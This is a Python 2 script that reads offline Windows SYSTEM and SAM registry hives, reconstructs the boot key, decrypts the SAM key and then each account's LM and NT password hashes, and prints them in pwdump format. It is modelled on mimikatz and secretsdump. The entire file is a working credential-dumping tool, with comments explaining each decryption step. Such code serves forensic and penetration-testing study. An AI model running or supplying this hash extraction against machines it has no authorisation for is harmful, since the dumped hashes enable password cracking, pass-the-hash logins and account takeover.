#!/usr/bin/env python
from Registry import Registry
import binascii
import struct
from Crypto.Cipher import AES
from Crypto.Cipher import DES

'''
References:
https://github.com/gentilkiwi/mimikatz
http://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/
https://microsoft.public.platformsdk.security.narkive.com/EkMyQZrb/maximum-size-of-sid
https://acad.ro/sectii2002/proceedings/doc2013-3s/05-OPREA.pdf
http://www.beginningtoseethelight.org/ntsecurity/index.htm
https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py
enum size
bool size
'''


# Redacted the registry.py file , key class to add class
class SAM_HASH:
	def __init__(self, buf, offset=0):
		self.buf = buf[offset:]
		self.pekid              = struct.unpack_from(str("<H"), self.buf,0)[0]
		self.revision           = struct.unpack_from(str("<H"), self.buf,2)[0]
		data			= buf[4:]

class SAM_HASH_AES:
	def __init__(self, buf, offset=0):
		self.buf = buf[offset:]
		self.pekid		= struct.unpack_from(str("<H"), self.buf,0)[0]
		self.revision		= struct.unpack_from(str("<H"), self.buf,2)[0]
		self.data_offset	= struct.unpack_from(str("<I"), self.buf,4)[0]
		self.salt		= struct.unpack_from(str("<16s"), self.buf,8)[0]
		self.data		= buf[24:]

class SAM_ENTRY:
	def __init__(self, buf, offset=0):
		self.buf = buf[offset:]
		self.offset 	= struct.unpack_from(str("<I"), self.buf,0)[0]
		self.length 	= struct.unpack_from(str("<I"), self.buf,4)[0]
		self.unk	= struct.unpack_from(str("<I"), self.buf,8)[0]

class USER_ACCOUNT_V:
	def __init__(self, buf, offset=0):
		self.buf = buf[offset:]
		self.unk0_header	= SAM_ENTRY(buf,0)
		self.username		= SAM_ENTRY(buf,12)
		self.fullname		= SAM_ENTRY(buf,24)
		self.comment		= SAM_ENTRY(buf,36)
		self.user_comment	= SAM_ENTRY(buf,48)
		self.unk1		= SAM_ENTRY(buf,60)
		self.homedir		= SAM_ENTRY(buf,72)
		self.homedir_connect	= SAM_ENTRY(buf,84)
		self.script_path	= SAM_ENTRY(buf,96)
		self.profile_path	= SAM_ENTRY(buf,108)
		self.workstations	= SAM_ENTRY(buf,120)
		self.hours_allowed	= SAM_ENTRY(buf,132)
		self.unk2		= SAM_ENTRY(buf,144)
		self.lm_hash		= SAM_ENTRY(buf,156)
		self.ntlm_hash		= SAM_ENTRY(buf,168)
		self.ntlm_history	= SAM_ENTRY(buf,180)
		self.lm_history		= SAM_ENTRY(buf,192)
		self.data		= buf[204:]

class SAM_KEY_DATA:
	def __init__(self, buf, offset=0):
		self.buf = buf[offset:]
		self.revision		= struct.unpack_from(str("<I"), self.buf,0)[0]
		self.length		= struct.unpack_from(str("<I"), self.buf,4)[0]

class SAM_KEY_DATA_AES:
	def __init__(self, buf, offset=0):
		self.buf = buf[offset:]
		self.revision		= struct.unpack_from(str("<I"), self.buf,0)[0]
		self.length		= struct.unpack_from(str("<I"), self.buf,4)[0]
		self.check_len		= struct.unpack_from(str("<I"), self.buf,8)[0]
		self.data_len		= struct.unpack_from(str("<I"), self.buf,12)[0]
		self.salt		= struct.unpack_from(str('<16s'), self.buf,16)[0]
		self.data		= struct.unpack_from(str('>80s'), self.buf,32)[0]

class DOMAIN_ACCOUNT_F:
	def __init__(self, buf, offset=0):
		self.buf = buf[offset:]
		self.revision 				= struct.unpack_from(str("<H"), self.buf,0)[0]
		self.unk0 				= struct.unpack_from(str("<H"), self.buf,2)[0]
		self.unk1 				= struct.unpack_from(str("<I"), self.buf,4)[0]
		self.creation_time 			= struct.unpack_from(str("<q"), self.buf,8)[0]
		self.domain_modified_count 		= struct.unpack_from(str("<q"), self.buf,16)[0]
		self.max_password_age 			= struct.unpack_from(str("<q"), self.buf,24)[0]
		self.min_password_age 			= struct.unpack_from(str("<q"), self.buf,32)[0]
		self.force_logoff 			= struct.unpack_from(str("<q"), self.buf,40)[0]
		self.lockout_duration 			= struct.unpack_from(str("<q"), self.buf,48)[0]
		self.lockout_observation_windows 	= struct.unpack_from(str("<q"), self.buf,56)[0]
		self.modified_count_at_last_promotion 	= struct.unpack_from(str("<q"), self.buf,64)[0]
		self.next_rid				= struct.unpack_from(str("<I"), self.buf,72)[0]
		self.password_properties		= struct.unpack_from(str("<I"), self.buf,76)[0]
		self.min_password_length		= struct.unpack_from(str("<H"), self.buf,80)[0]
		self.password_history_length		= struct.unpack_from(str("<H"), self.buf,82)[0]
		self.lockout_threshold			= struct.unpack_from(str("<H"), self.buf,84)[0]
		self.unk2				= struct.unpack_from(str("<H"), self.buf,86)[0]
		self.domain_server_enable_state		= struct.unpack_from(str("<I"), self.buf,88)[0]
		self.domain_server_role			= struct.unpack_from(str("<I"), self.buf,92)[0]
		self.uas_compatibility_required		= struct.unpack_from(str("<I"), self.buf,96)[0]
		self.unk3				= struct.unpack_from(str("<I"), self.buf,100)[0]
		self.key1				= SAM_KEY_DATA_AES(buf,104)
		self.unk4				= struct.unpack_from(str("<q"), self.buf,216)[0]
		self.unk5				= struct.unpack_from(str("<q"), self.buf,224)[0]
		self.key2				= SAM_KEY_DATA_AES(buf,232)
		self.unk6				= struct.unpack_from(str("<q"), self.buf,344)[0]
		self.unk7				= struct.unpack_from(str("<q"), self.buf,352)[0]
		self.unk8				= struct.unpack_from(str("<q"), self.buf,360)[0]

class SID:
	def __init__(self, buf, offset=0):
		self.buf = buf[offset:]
		self.revision			= ord(struct.unpack_from(str("<c" ), self.buf,0)[0])
		self.sub_authority_count	= ord(struct.unpack_from(str("<c" ), self.buf,1)[0])
		self.identifier_authority	= int(struct.unpack_from(str("<6s"), self.buf,2)[0].encode('hex'),16)
		self.data			= buf[8:]
		self.sub_authority		= []
		self.parse_sub_authority()

	def parse_sub_authority(self):
		for i in xrange(self.sub_authority_count):
			sa = struct.unpack_from(str("<I" ), self.data, i*4)[0]
			self.sub_authority.append( sa )

	def get_sid_str(self):
		format_str = "S-%d-%d" + "-%d"*self.sub_authority_count
		sid_str = "S-%d-%d" % (self.revision, self.identifier_authority)
		for i in xrange(self.sub_authority_count):
			sid_str += "-%d" % self.sub_authority[i]
		return sid_str


def get_current_control_set(system_hive):
	select_key = system_hive.open("Select")

	for value in select_key.values():
		if value.name() == "Current":
			return ("ControlSet%03d" % (value.value()))

def get_computer_name(system_hive, control_set):
	computer_name_key = system_hive.open(control_set + "\\Control\\ComputerName\\ComputerName")

	for value in computer_name_key.values():
		if value.name() == "ComputerName":
			return value.value()

def get_sys_key(system_hive, control_set):
	permut = [11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4]
	syskey = []
	# Syskey is produced by first merging the hidden class name attribute of four keys: JD, Skew1, GBG and Data
	# The data is in Little Endian format
	buffer =  system_hive.open(control_set + "\\Control\\Lsa\\JD"   ).get_class().decode('hex')[::-1]
	buffer += system_hive.open(control_set + "\\Control\\Lsa\\Skew1").get_class().decode('hex')[::-1]
	buffer += system_hive.open(control_set + "\\Control\\Lsa\\GBG"  ).get_class().decode('hex')[::-1]
	buffer += system_hive.open(control_set + "\\Control\\Lsa\\Data" ).get_class().decode('hex')[::-1]

	# Then the bytes of the mereged class names are permutated according to the
	# perm array
	for i in xrange(16):
		syskey.append(buffer[permut[i]])
	return (''.join(syskey))

def get_sid(sam_hive):
	account_key = sam_hive.open("SAM\\Domains\\Account")

	for value in account_key.values():
		if value.name() == "V":
			data = value.value()

	sid_bytes = data[-24:]
	sid = SID(sid_bytes)
	return sid.get_sid_str()

def decrypt_aes_cbc(key, iv, ciphertext):
	aes = AES.new(key ,AES.MODE_CBC, iv)
	plaintext = aes.decrypt(ciphertext)
	return plaintext

def get_sam_key(sam_hive, syskey):
	account_key = sam_hive.open("SAM\\Domains\\Account")

	for value in account_key.values():
                if value.name() == "F":
                        data = value.value()

	account = DOMAIN_ACCOUNT_F(data)
	if account.revision == 2:
		if account.key1.revision == 1:
			pass # MD5 RC4
		else:
			print "EEERRR"
	elif account.revision == 3:
		if account.key1.revision == 2:
			encrypted_data = account.key1.data[:account.key1.data_len]
			decrypted_data = decrypt_aes_cbc(syskey, account.key1.salt, encrypted_data)
		else:
			print "EEERRR"
	else:
		print "EEEERRRRORRR"
	return decrypted_data[:16]

# source: http://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/
def expand_des_key(bkey):
	keyarr = []
	for i in range(0, len(bkey)): keyarr.append(int(binascii.hexlify(bkey[i]),16))
	bytearr = []
	bytearr.append(keyarr[0]>>1)
	bytearr.append(((keyarr[0] & 0x01) << 6) | keyarr[1] >> 2)
	bytearr.append(((keyarr[1] & 0x03) << 5) | keyarr[2] >> 3)
	bytearr.append(((keyarr[2] & 0x07) << 4) | keyarr[3] >> 4)
	bytearr.append(((keyarr[3] & 0x0F) << 3) | keyarr[4] >> 5)
	bytearr.append(((keyarr[4] & 0x1F) << 2) | keyarr[5] >> 6)
	bytearr.append(((keyarr[5] & 0x3F) << 1) | keyarr[6] >> 7)
	bytearr.append(keyarr[6]&0x7F)
	result = ''
	for b in bytearr:
		bit = bin(b*2)[2:].zfill(8)
		if bit.count('1') %2 == 0:
			result += hex((b * 2) ^ 1)[2:].zfill(2)
		else:
			result += hex(b * 2)[2:].zfill(2)
	return result.decode('hex')

def decrypt_hash(ciphertext, rid):
	# Generate two DES keys derived from the RID
	# RID should be in Little Endian format
	b_rid = struct.pack("<I",rid)

	# First key is repeated until it's expanded to 7 bytes: [0,1,2,3,0,1,2]
	des_src1 = b_rid + b_rid[:3]

	# Second key is rotated to start from the last element
	# and then also is repeated until it's expanded to 7 bytes: [3,0,1,2,3,0,1]
	des_src2 = b_rid[3] + b_rid + b_rid[:2]

	# The keys are transformed with added parity
	# They are now 8 bytes long
	des_key1 = expand_des_key(des_src1)
	des_key2 = expand_des_key(des_src2)

	# The ciphertext is split in half
	# Each half is decrypted independently with different key
	des1 = DES.new(des_key1)
	plaintext1 = des1.decrypt(ciphertext[:8])

	des2 = DES.new(des_key2)
	plaintext2 = des2.decrypt(ciphertext[8:])
	# The hash is produced by merging the obtained plaintexts
	hash = plaintext1 + plaintext2
	return hash

def get_hash(sam_hash, samkey, user_rid):
	if sam_hash.revision == 1:
		print "NOOOOOOOOOO"
		pass # MD5 RC4
	elif sam_hash.revision == 2:
		if len(sam_hash.data) == 0:
			# When hash data is empty pass known data and set rid=0
			# for the DES decryption
			sam_hash_des = 'KGS!@#$%KGS!@#$%'
			user_rid = 0
		else:
			# Hash is encrypted as AES( DES( HASH[:8],key1 ) + DES( HASH[8:],key2 ) )
			# First decrypt AES
			sam_hash_des = decrypt_aes_cbc(samkey, sam_hash.salt,  sam_hash.data)[:16]
		# Next decrypt the two ciphertext halves with DES
		hash = decrypt_hash(sam_hash_des, user_rid)
	else:
		print "errrrr"
	return hash

def dump_hash(sam_hive, samkey):
	users_key = sam_hive.open("SAM\\Domains\\Account\\Users")
	names_key = sam_hive.open("SAM\\Domains\\Account\\Users\\Names")

	for subkey in names_key.subkeys():
		user_rid = subkey.values()[0].value_type()
		user_subkey = sam_hive.open(("SAM\\Domains\\Account\\Users\\%08x" % (user_rid)))
		for value in user_subkey.values():
			if value.name() == "V":
				account = USER_ACCOUNT_V(value.value())

		u_length = account.username.length
		u_offset = account.username.offset
		username = account.data[u_offset : u_offset + u_length]

		h_lm_length = account.lm_hash.length
		h_lm_offset = account.lm_hash.offset
		h_lm_data = account.data[h_lm_offset:h_lm_offset+h_lm_length]
		sam_lm_hash_aes = SAM_HASH_AES(h_lm_data)

		h_nt_length = account.ntlm_hash.length
                h_nt_offset = account.ntlm_hash.offset
		h_nt_data = account.data[h_nt_offset : h_nt_offset+h_nt_length]
                sam_nt_hash_aes = SAM_HASH_AES(h_nt_data)

		lm_hash = get_hash(sam_lm_hash_aes, samkey, user_rid)
		nt_hash = get_hash(sam_nt_hash_aes, samkey, user_rid)
		print "\nUser: ", username
		print "RID:  ", user_rid
		print "LMHash: ", lm_hash.encode('hex')
		print "NTHash: ", nt_hash.encode('hex')
		print "%s:%s:%s:%s:::" % (username, user_rid, lm_hash.encode('hex'), nt_hash.encode('hex'))

# Load registry hives
f_system_hive = open("system.hive","rb")
r_system_hive = Registry.Registry(f_system_hive)

f_sam_hive = open("sam.hive","rb")
r_sam_hive = Registry.Registry(f_sam_hive)


control_set = get_current_control_set(r_system_hive)
hostname = get_computer_name(r_system_hive, control_set)
print "Hostname:", hostname

sid = get_sid(r_sam_hive)
print "SID: ", sid

# SYSkey = f(JD,Skew1,GBG,Data)
# SAMKey = AESdec(DomAccF, SYSkey)
# hash = DESdec(AESdec(AccV,SAMkey),f(RID))

syskey = get_sys_key(r_system_hive, control_set)
print "\nsyskey: ", syskey.encode('hex')

samkey = get_sam_key(r_sam_hive, syskey)
print "samkey: ", samkey.encode('hex')

dump_hash(r_sam_hive, samkey)
